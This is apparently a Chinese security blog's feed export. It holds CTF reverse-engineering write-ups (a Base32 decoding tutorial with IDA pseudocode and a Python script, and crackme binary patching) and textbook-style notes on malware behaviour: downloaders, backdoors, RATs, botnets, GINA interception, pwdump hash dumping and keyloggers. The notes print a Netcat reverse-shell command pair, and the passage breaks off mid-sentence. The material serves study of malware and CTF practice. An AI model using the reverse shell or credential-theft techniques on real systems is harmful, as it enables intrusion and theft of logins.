title="逆向分析"></a>逆向分析</h2><p>前面写了这么多，终于到重头戏逆向了，先简略概括一下基本运算法则吧</p><blockquote><p>base64编码是用64（2的6次方）个ASCII字符来表示256（2的8次方）个ASCII字符，也就是三位二进制数组经过编码后变为四位的ASCII字符显示，长度比原来增加1/3。</p></blockquote><blockquote><p>同样，base32就是用32（2的5次方）个特定ASCII码来表示256个ASCII码。所以，5个ASCII字符经过base32编码后会变为8个字符（公约数为40），长度增加3/5.不足8n用“=”补足。</p></blockquote><blockquote><p>base16就是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过base16编码后会变为2个字符，长度增加一倍。不足2n用“=”补足</p></blockquote><p>Base32在比赛中常见到，就拿Base32的题来举例了</p><p>两道题的完整wp都在博客里 ,(<a href="https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/" target="_blank" rel="noopener">https://kabeor.cn/2017%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9BNonstandard/</a>          ,<br><a href="https://kabeor.cn/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/" target="_blank" rel="noopener">https://kabeor.cn/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/</a>)</p><p>提取重点部分来说</p><h3 id="1-数据"><a href="#1-数据" class="headerlink" title="1. 数据"></a>1. 数据</h3><p>Base系列的补位“=”算是最明显的提示标志了，搜索字符串时见到类似下图就可以考虑Base了</p><p><a href="https://i.loli.net/2018/07/15/5b4b3ffbc388a.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b3ffbc388a.jpg" class="lazyload"></a></p><h3 id="2-反汇编伪代码"><a href="#2-反汇编伪代码" class="headerlink" title="2. 反汇编伪代码"></a>2. 反汇编伪代码</h3><p>IDA F5，看到大量移位，如图</p><p><a href="https://i.loli.net/2018/07/15/5b4b3ffbea9c0.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b3ffbea9c0.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        v14 &#x3D; v13;</span><br><span class="line">        HIDWORD(v15) &#x3D; v19;</span><br><span class="line">        LODWORD(v15) &#x3D; v23 &amp; 0xFFFFFFF8;</span><br><span class="line">        HIDWORD(v16) &#x3D; v30 | ((unsigned __int64)(v18 &amp; 1) &gt;&gt; 24);</span><br><span class="line">        LODWORD(v16) &#x3D; (((v23 &amp; 0xFFFFFFF8) &lt;&lt; 8) + (v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8)) + (v18 &amp; 0x3E)) &lt;&lt; 8;</span><br><span class="line">        v17 &#x3D; ((v14 &amp; 0x1F)</span><br><span class="line">             + __PAIR__(</span><br><span class="line">                 HIDWORD(v14) | (unsigned int)((unsigned __int64)(v20 &amp; 3) &gt;&gt; 24),</span><br><span class="line">                 v14 &amp; 0xFFFFFFE0 | ((v20 &amp; 3) &lt;&lt; 8))</span><br><span class="line">             + ((__PAIR__(</span><br><span class="line">                   v31 | (unsigned int)((unsigned __int64)(v21 &amp; 0xF) &gt;&gt; 24),</span><br><span class="line">                   v20 &amp; 0xFFFFFF80 | ((v21 &amp; 0xF) &lt;&lt; 8))</span><br><span class="line">               + ((__PAIR__(</span><br><span class="line">                     (__PAIR__(v15 &gt;&gt; 24, (v23 &amp; 0xFFFFFFF8) &lt;&lt; 8)</span><br><span class="line">                    + __PAIR__(</span><br><span class="line">                        v29 | (unsigned int)((unsigned __int64)(v23 &amp; 7) &gt;&gt; 24),</span><br><span class="line">                        v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8))</span><br><span class="line">                    + (v18 &amp; 0x3E)) &gt;&gt; 24,</span><br><span class="line">                     v21 &amp; 0xFFFFFFF0 | ((v18 &amp; 1) &lt;&lt; 8))</span><br><span class="line">                 + v16) &lt;&lt; 8)</span><br><span class="line">               + (v20 &amp; 0x7C)) &lt;&lt; 8)) &gt;&gt; 32;</span><br><span class="line">        HIDWORD(v14) &#x3D; (v14 &amp; 0x1F)</span><br><span class="line">                     + (v14 &amp; 0xFFFFFFE0 | ((v20 &amp; 3) &lt;&lt; 8))</span><br><span class="line">                     + (((v20 &amp; 0xFFFFFF80 | ((v21 &amp; 0xF) &lt;&lt; 8))</span><br><span class="line">                       + (((v21 &amp; 0xFFFFFFF0 | ((v18 &amp; 1) &lt;&lt; 8)) + (_DWORD)v16) &lt;&lt; 8)</span><br><span class="line">                       + (v20 &amp; 0x7C)) &lt;&lt; 8);</span><br><span class="line">        *v24 &#x3D; byte_403020[(unsigned __int8)v17 &gt;&gt; 3];</span><br><span class="line">        v24[1] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 30) &amp; 0x1F];</span><br><span class="line">        v24[2] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 25) &amp; 0x1F];</span><br><span class="line">        v24[3] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 20) &amp; 0x1F];</span><br><span class="line">        v24[4] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 15) &amp; 0x1F];</span><br><span class="line">        v24[5] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 10) &amp; 0x1F];</span><br><span class="line">        LOBYTE(v16) &#x3D; __PAIR__(v17, HIDWORD(v14)) &gt;&gt; 5;</span><br><span class="line">        v3 &#x3D; v25;</span><br><span class="line">        v24[6] &#x3D; byte_403020[v16 &amp; 0x1F];</span><br><span class="line">        LOBYTE(v16) &#x3D; byte_403020[BYTE4(v14) &amp; 0x1F];</span><br><span class="line">        v2 &#x3D; v32;</span><br><span class="line">        v24[7] &#x3D; v16;</span><br><span class="line">        v24 +&#x3D; 8;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v8 &lt; v25 );</span><br><span class="line">      result &#x3D; v28;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v22 &gt; 0 )</span><br><span class="line">      memset(&amp;result[v26], 61u, v22);</span><br><span class="line">    *(&amp;v28[v26] + v22) &#x3D; 0;</span><br><span class="line">    result &#x3D; v28;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>核心算法提取出来了，我们看到了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LODWORD(v16) &#x3D; (((v23 &amp; 0xFFFFFFF8) &lt;&lt; 8) + (v18 &amp; 0xFFFFFFC0 | ((v23 &amp; 7) &lt;&lt; 8)) + (v18 &amp; 0x3E)) &lt;&lt; 8;</span><br></pre></td></tr></table></figure></div><p>和</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v24[1] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 30) &amp; 0x1F];</span><br><span class="line">v24[2] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 25) &amp; 0x1F];</span><br><span class="line">v24[3] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 20) &amp; 0x1F];</span><br><span class="line">v24[4] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 15) &amp; 0x1F];</span><br><span class="line">v24[5] &#x3D; byte_403020[(__PAIR__(v17, HIDWORD(v14)) &gt;&gt; 10) &amp; 0x1F];</span><br></pre></td></tr></table></figure></div><p>每次取5个比特，分别赋给8个值，每个值5个位 ,显然的base32</p><h3 id="3-table"><a href="#3-table" class="headerlink" title="3. table"></a>3. table</h3><p>table一般在核心算法的上一层函数，数据段也有所显现，当然table也许会被加密或者替换，但都是类似异或，转换进制，运算，奇偶位之类的，照着写脚本就好，</p><p>像下图这样就是经过了字母倒序，奇数小写偶数大写，尾部追加得到table</p><p><a href="https://i.loli.net/2018/07/15/5b4b3ffc33cd8.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b3ffc33cd8.jpg" class="lazyload"></a></p><h2 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h2><p>Python3脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; &quot;密文&quot;</span><br><span class="line">table &#x3D; &quot;表&quot;</span><br><span class="line"></span><br><span class="line">def find(x):</span><br><span class="line">    if(x&#x3D;&#x3D;&#39;&#x3D;&#39;):</span><br><span class="line">        return 0</span><br><span class="line">    return table.index(x)</span><br><span class="line"></span><br><span class="line">for i in range(len(s)&#x2F;&#x2F;8):</span><br><span class="line">    p &#x3D; s[i*8:i*8+8]</span><br><span class="line">    t &#x3D; 0</span><br><span class="line">    for j in p:</span><br><span class="line">        t &#x3D; t&lt;&lt;5</span><br><span class="line">        t +&#x3D; find(j)</span><br><span class="line">    for j in range(5):</span><br><span class="line">        print(chr((t&amp;0xff00000000)&gt;&gt;32), end&#x3D;&#39;&#39;)</span><br><span class="line">        t &#x3D; t&lt;&lt;8</span><br></pre></td></tr></table></figure></div><h2 id="魔改Base"><a href="#魔改Base" class="headerlink" title="魔改Base"></a><strong>魔改Base</strong></h2><p>经过上面的分析也就可以知道Base中可变的几个部分</p><p>CTF中常见的变化位置有下面几个</p><blockquote><ol><li>table</li></ol></blockquote><p>这个上面提到了。。</p><blockquote><ol start="2"><li>移位数据变化</li></ol></blockquote><p>从例子可以看出决定了题中Base-N的N是多少的是移位个数和移位距离<br>只要抓住算法的核心思想就能很快识别出来</p><blockquote><ol start="3"><li>组合</li></ol></blockquote><p>很多题都会通过组合加密的方式来提升题目难度，Base中应该就是加密密文和table了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>差不多就是这样了，Base-N相对来说只要熟悉模板就能很快识别了。</p><p>希望自己能坚持下去，分析不同的算法：）</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Base-N算法及逆向初探&quot;&gt;&lt;a href=&quot;#Base-N算法及逆向初探&quot; class=&quot;headerlink&quot; title=&quot;Base-N算法及逆向初探&quot;&gt;&lt;/a&gt;Base-N算法及逆向初探&lt;/h1&gt;&lt;p&gt;上次研究了&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ebCTF2013 RE</title>
    <link href="https://kabeor.github.io/ebCTF2013%20RE/"/>
    <id>https://kabeor.github.io/ebCTF2013%20RE/</id>
    <published>2018-09-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:43:20.707Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ebCTF2013-RE"><a href="#ebCTF2013-RE" class="headerlink" title="ebCTF2013 RE"></a>ebCTF2013 RE</h2><p>今天在看以前的笔记时看到了这篇，觉得有意思，就放上来了</p><p>放入IDA中分析，先看下流程：</p><p><a href="https://i.loli.net/2018/09/04/5b8decf7c9753.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8decf7c9753.jpg" class="lazyload"></a></p><p>找到主函数，空格<br>可以看到具体的一些步骤和相互之间的关系</p><p><a href="https://i.loli.net/2018/09/04/5b8ded2313e2b.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8ded2313e2b.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/09/04/5b8ded2c4d7b8.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8ded2c4d7b8.jpg" class="lazyload"></a></p><p>大体就是这样<br>点击view-&gt;open subviews-&gt;strings  可以看到分析出的字符串</p><p><a href="https://i.loli.net/2018/09/04/5b8ded509b665.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8ded509b665.jpg" class="lazyload"></a></p><p>这就是程序运行时的流程，可以看出，我们需要投掷3-1-3-3-7，这几乎是不可能的，所以我们需要改动跳转的判断条件。</p><p>F5键可以打开插件HexRays 查看伪代码</p><p><a href="https://i.loli.net/2018/09/04/5b8ded60a561a.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8ded60a561a.jpg" class="lazyload"></a></p><p>可以看出这里的判断条件<br>于是结合流程图我们可以看出，应该修改的是每一部分最后一个跳转，此语句本来是jnz跳转，我们只需把它修改成jz即可</p><p>通过edit-&gt;patch program-&gt;change byte 修改机器码，把原来开头的75改为74即可</p><p>最后运行一下发现每次成功后flag都会一闪而过</p><p>于是我们应该把最后的跳转到retn的jmp给nop掉<br>大功告成</p><p><a href="https://i.loli.net/2018/09/04/5b8dede193bfb.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8dede193bfb.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;ebCTF2013-RE&quot;&gt;&lt;a href=&quot;#ebCTF2013-RE&quot; class=&quot;headerlink&quot; title=&quot;ebCTF2013 RE&quot;&gt;&lt;/a&gt;ebCTF2013</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第八届swpu网络安全大赛逆向r2 r3</title>
    <link href="https://kabeor.github.io/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/"/>
    <id>https://kabeor.github.io/%E7%AC%AC%E5%85%AB%E5%B1%8Aswpu%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%80%86%E5%90%91r2%20r3/</id>
    <published>2018-09-03T16:00:00.000Z</published>
    <updated>2020-03-16T04:26:44.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第八届swpu网络安全大赛逆向r2-r3"><a href="#第八届swpu网络安全大赛逆向r2-r3" class="headerlink" title="第八届swpu网络安全大赛逆向r2 r3"></a>第八届swpu网络安全大赛逆向r2 r3</h1><p>也是以前的题了</p><h2 id="R2：bin100"><a href="#R2：bin100" class="headerlink" title="R2：bin100"></a>R2：bin100</h2><p>打开程序<br><a href="https://i.loli.net/2018/09/04/5b8deefecd76d.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8deefecd76d.jpg" class="lazyload"></a></p><p>。。。。。什么也没有<br>尝试输入，输到16位后提醒重试<br>用OD打开</p><p>界面像是输序列号，正好在看雪论坛看到以下内容</p><p><a href="https://i.loli.net/2018/09/04/5b8def1d19c71.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8def1d19c71.jpg" class="lazyload"></a></p><p>于是查找windowtextA</p><p><a href="https://i.loli.net/2018/09/04/5b8def2d25c46.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8def2d25c46.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/09/04/5b8def34d0fae.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8def34d0fae.jpg" class="lazyload"></a></p><p>一直F8，看到cmp，应该是判断输入是否满足16位<br>打开IDA ，F5看伪代码</p><p><a href="https://i.loli.net/2018/09/04/5b8def45a9635.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8def45a9635.jpg" class="lazyload"></a></p><p>然后接下来应记下关键跳转的地址，在IDA中分析，<br>输入的数字经过一系列计算，最后与一个字符串对比<br>得出flag</p><h2 id="R3：bin200"><a href="#R3：bin200" class="headerlink" title="R3：bin200"></a>R3：bin200</h2><p>先查壳</p><p><a href="https://i.loli.net/2018/09/04/5b8defbc9e8a2.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8defbc9e8a2.jpg" class="lazyload"></a></p><p>VC++写的<br>先用IDA调试：<br>查找字符串，发现一串数字08067<br>跟随后F5</p><p><a href="https://i.loli.net/2018/09/04/5b8defccf0ede.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/09/04/5b8defccf0ede.jpg" class="lazyload"></a></p><p>可以看到result=8，应该是要对比已通关数和总关数8<br>然后跟着往下发现对比的if语句，找到相等时的跳转的地址，在OD上找到这个地址，就可以找出flag</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第八届swpu网络安全大赛逆向r2-r3&quot;&gt;&lt;a href=&quot;#第八届swpu网络安全大赛逆向r2-r3&quot; class=&quot;headerlink&quot; title=&quot;第八届swpu网络安全大赛逆向r2 r3&quot;&gt;&lt;/a&gt;第八届swpu网络安全大赛逆向r2</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第11章  恶意代码行为</title>
    <link href="https://kabeor.github.io/%E7%AC%AC11%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/"/>
    <id>https://kabeor.github.io/%E7%AC%AC11%E7%AB%A0%20%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/</id>
    <published>2018-09-01T16:00:00.000Z</published>
    <updated>2020-03-16T04:25:40.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第11章-恶意代码行为"><a href="#第11章-恶意代码行为" class="headerlink" title="第11章  恶意代码行为"></a>第11章  恶意代码行为</h1><h2 id="11x1-下载器和启动器"><a href="#11x1-下载器和启动器" class="headerlink" title="11x1 下载器和启动器"></a>11x1 下载器和启动器</h2><p>常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行。下载器通常会与漏洞利用（exploit）打包在一起。下载器常用Windows API函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。</p><p>启动器（也称为加载器）是一类可执行文件，用来安装立即运行或者将来秘密执行的恶意代码。启动器通常包含一个它要加载的恶意代码。</p><h2 id="11x2-后门（backdoor）"><a href="#11x2-后门（backdoor）" class="headerlink" title="11x2 后门（backdoor）"></a>11x2 后门（backdoor）</h2><p>后门（backdoor）是另一种类型的恶意代码，它能让攻击者远程访问一个受害的机器。后门是一种最常见的恶意代码，它们拥有多种功能，并且以多种形式与大小存在。后门代码往往实现了全套功能，所以当使用一个后门时，攻击者通常不需要下载额外的恶意代码。</p><p>后门程序利用互联网的通信方式是多样的，但是一个常用的方法是利用80端口使用HTTP协议。<br>HTTP是出站流量最常使用的协议，所以它为恶意代码提供了一个与其他流量混淆的好机会。</p><p>后门拥有一套通用的功能，例如操作注册表、列举窗口、创建目录、搜索文件，等等。查看后门使用和导入的Windows函数，可以确定后门程序实现的功能。</p><h3 id="1-反向shell"><a href="#1-反向shell" class="headerlink" title="1. 反向shell"></a>1. 反向shell</h3><p>反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限。反向shel或者作为一个单独的恶意代码存在，或者作为一个复杂后门程序中的组件而存在。在反向shell中，攻击者能够如同在本地系统上一样运行命令。</p><blockquote><p>Netcat反向shell</p></blockquote><p>可以通过在两台机器上运行Netcat，来创建一个反向shell。同时，攻击者已经知道在恶意代码中使用Netcat，或者和其他恶意程序一起打包使用。</p><p>Netcat被作为一个反向shell使用时，远程机器使用下列命令，等待入站连接。<br><code>nc -l -p 80</code><br>-1选项设置Netcat为监听模式，-p用来设置监听端口。接下来，受害机器向外连出，并且使用下列命令提供shell。<br><code>nc 1istener_ip 80 -e cmd.exe</code><br>Listener_ip 80是远程机器的IP地址和端口。-e选项用来指定连接建立后要运行的程序，并将这一程序标准输入和输出与套接字进行绑定。</p><blockquote><p>Windows反向shell</p></blockquote><p>使用cmd.exe作为Windows系统中的反向shell，有两种简单的恶意编码实现：基础方法和多线程技术。</p><p>基础方法在恶意代码编写者之间比较流行，因为它容易编写，且效果与多线程技术一致。它涉及CreateProcess函数的调用，并操纵传递给CreateProcess的STARTUPINFO结构。首先，创建一个套接字，并与远程服务器建立连接。然后，绑定这个套接字与cmd.exe标准流（标准输入、标准输出以及标准错误）。调用CreateProcess函数用隐藏窗口的方式创建cmd.exe程序，对受害者隐藏cmd.exe进程。</p><p>Windows反向shell的多线程版本涉及一个套接字、两个管道及两个线程的创建（查询API调用函数CreateThread、CreatePipe）。恶意代码有时将这种方法作为策略，来篡改或编码经过一个套接字传入或传出的数据。CreatePipe用来绑定一个管道的读写端，如标准输入（stdin）和标准输出（stdout）。CreateProcess方法用来绑定一个管道与标准流，而不是直接与套接字绑定。调用CreateProcess方法，恶意代码会产生两个线程：一个用来从标准输入管道读数据，并且向套接字写数据，另外一个用来从一个套接字读数据，并且向一个标准输出管道写数据。通常这两个线程使用数据编码来篡改数据。</p><h3 id="2-远程控制工具"><a href="#2-远程控制工具" class="headerlink" title="2. 远程控制工具"></a>2. 远程控制工具</h3><p>远程控制工具（RAT）被用来远程管理一台或多台计算机。远程控制工具经常为了特定目标，如窃取信息或者旁路一个网络执行针对性的攻击。</p><p>服务器端运行在一个被植入恶意代码的受害主机上。客户端作为攻击者远程操纵运行命令和控制的单元。服务器端命令客户端开始一个连接，同时它们也被客户端控制。远程控制工具通常通过如80、443等常用的端口通信。</p><blockquote><p>远程控制工具的网络结构<br><a href="https://i.loli.net/2018/07/23/5b55432e2760f.jpg" data-fancybox="group" data-caption="i" class="fancybox"><img alt="i" title="i" data-src="https://i.loli.net/2018/07/23/5b55432e2760f.jpg" class="lazyload"></a></p></blockquote><blockquote><p>Poison lvy（ <a href="http://www.poisonivy-rat.com/" target="_blank" rel="noopener">http://www.poisonivy-rat.com/</a> ）（<a href="http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/" target="_blank" rel="noopener">http://www.primalsecurity.net/poison-ivy-remote-access-tool-rat/</a> ）是一个免费提供且流行的远程控制工具。它的功能由shellcode插件控制，这使得它具有良好的扩展性。Poison Ivy是一款有用的工具，它能够快速生成用来测试和分析的恶意样本。</p></blockquote><h3 id="3-僵尸网络"><a href="#3-僵尸网络" class="headerlink" title="3. 僵尸网络"></a>3. 僵尸网络</h3><p>僵尸网络是被感染主机（也称为僵尸主机）的一个集合。它们由单一实体控制，通常由一个称为僵尸控制器的机器作为服务器。僵尸网络的目标是尽可能多地感染机器，来构建一个更大的僵尸主机网络，从而使僵尸网络传播其他的恶意代码或蠕虫，或者执行分布式拒绝服务（DDoS）攻击。</p><p>在实施分布式拒绝服务攻击时，所有僵尸主机会在同一时刻访问同一个站点，僵尸网络能够让这个站点挂掉。</p><h3 id="4-远程控制工具与僵尸网络的比较"><a href="#4-远程控制工具与僵尸网络的比较" class="headerlink" title="4. 远程控制工具与僵尸网络的比较"></a>4. 远程控制工具与僵尸网络的比较</h3><p>在远程控制工具与僵尸网络之间有一些不同</p><ol><li>僵尸网络感染和控制数以百万计的主机。远程控制工具通常只控制很少数量的主机。</li><li>僵尸网络中的所有主机在同一时刻被控制，而远程控制工具是以每个受害者为单位进行远程控制，因为远程控制工具要求攻击者与受害主机之间更紧密地交互。</li><li>远程控制工具被用来执行针对性的攻击，而僵尸网络用来进行大规模攻击。</li></ol><h2 id="11x3-登录凭证窃密器"><a href="#11x3-登录凭证窃密器" class="headerlink" title="11x3 登录凭证窃密器"></a>11x3 登录凭证窃密器</h2><p>攻击者经常会不遗余力地去窃取登录凭证，他们主要使用以下三种类型的恶意代码</p><ol><li>等待用户登录以窃取登录凭证的程序。</li><li>转储Windows系统中存放信息的程序，例如密码哈希值，程序直接使用它，或者对它进行离线破解。</li><li>击键记录程序。</li></ol><h3 id="1-GINA拦截"><a href="#1-GINA拦截" class="headerlink" title="1. GINA拦截"></a>1. GINA拦截</h3><p>在WindowsXP系统中，恶意代码使用微软图形识别和验证界面（GINA）拦截技术来窃取用户的登录凭证。GINA的设计目的是让合法第三方通过添加一些代码，来自定义登录过程，如用硬件无线射频标识（RFID）令牌或者智能卡来进行身份认证等。恶意代码编写者利用GINA对第三方的支持来加载窃密器。</p><p>GINA在msgna.dll中实现，这个DLL在用户登录系统过程中由Winlogon可执行文件加载。Winlogon也为第三方定制实现DLL程序工作，在Winlogon与GINADLL之间加载第三方DLL（类似于中间人攻击）。为了方便，Windows用下列注册表项，来存储需要Winlogon加载的第三方DLL。<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\winlogon\GinaDLL</code></p><h3 id="2-口令哈希转储"><a href="#2-口令哈希转储" class="headerlink" title="2. 口令哈希转储"></a>2. 口令哈希转储</h3><p>转储Windows口令哈希是恶意代码获取系统登录凭证的一种流行方法。攻击者试图抓取这些口令哈希，以便离线暴力破解，或者利用它们执行Pass-the-Hash攻击。Pass-the-Hash攻击在无须破解或解密口令哈希以获取明文密码的情况下，使用LM或者NTLM哈希来通过远程主机的身份验证，从而获得访问权。</p><p>Pwdump和Pas-the-Hash（PSH）工具包是提供口令哈希转储免费可用的软件包。因为这两种工具都开源，很多恶意代码都派生于它们的源码。因为多数反病毒软件都拥有它们标准版本的特征码，所以通常情况下，攻击者要逃避探测就会编译他们的专有版本。</p><p>pwdump是一个程序集合，它从安全账户管理器（SAM）输出本地用户账户的LM和NTLM口令哈希。pwdump通过注入DLL到本地安全认证子系统服务（LSASS）进程进行攻击。我们将在第12章深入讨论DLL注入技术。现在，我们仅需要了解DLL注入是恶意代码在另外一个进程中运行DLL的一种方法，因此它提供了DLL与被注入进程相同的权限。口令哈希转储工具通常针对lsass.exe进程，因为它拥有足够的权限来访问很多有用的API函数。</p><p>标准pwdump程序使用的DLL是lsaext.dll，一旦DLL在lsass.exe中运行，pwdump就会调用GetHash，这个函数由lsaext.dll导出，目的是执行口令哈希提取。提取函数会使用未文档化的Windows函数，来枚举系统中的用户，并且获得每个用户未解密的口令哈希。</p><p>处理pwdump程序变种时，你需要分析DLL，以便确定它如何执行口令哈希转储操作。首先查看DLL的导出函数，pwdump默认的导出函数是GetHash，但是攻击者可以很容易地修改这个导出函数的名字，使它不那么显而易见。接下来，尝试确定导出函数使用的API函数。因为多数API函数需要动态解析，所以口令哈希转储导出函数通常会多次调用GetProcAddress。</p><h3 id="3-击键记录"><a href="#3-击键记录" class="headerlink" title="3. 击键记录"></a>3. 击键记录</h3><p>击键记录是一种传统形式的窃取登录凭证方法。当击键记录开启时，恶意代码能够记录用户击键操作，从而让攻击者能够观察到用户敲入的数据，如用户名、密码。Windows平台上的恶意代码使用多种形式的击键记录。</p><blockquote><p>基于内核的击键记录器</p></blockquote><p>用户模式下的应用程序很难探测到基于内核的击键记录器。它们经常作为Rootkit的一部分并且它们作为一个键盘驱动绕过用户空间应用程序和保护，来捕获击键操作。</p><blockquote><p>用户空间的击键记录器</p></blockquote><p>Windows用户空间的击键记录器通常使用WindowsAPI并且常通过挂钩（hook）或者轮询来实现。</p><p>挂钩在键盘每次按下时用Windows API通知恶意代码，通常使用SetwindowsHookEx安装挂钩。轮询使用Windows API不断地轮询按键的状态，它通常使用函数GetAsyncKeyState和GetForegroundWindow。</p><p>挂钩击键记录器使用的WindowsAPl函数是SetwindowsHookEx。这种类型的恶意代码可能被打包成一个初始化挂钩函数的可执行文件，它也可能包含一个处理击键记录的DLL文件，这个DLL文件被自动地映射到系统的多个进程中。</p><p>GetAsynckeyState函数用来识别一个按键是被按下还是被弹起，是否是在最近一次GetAsyncKeyState函数被调用后按下。GetForegroundWindow函数识别当前聚焦的前端窗口，它告诉击键记录器当前哪个应用程序正在执行输入（例如Notepad、Internet 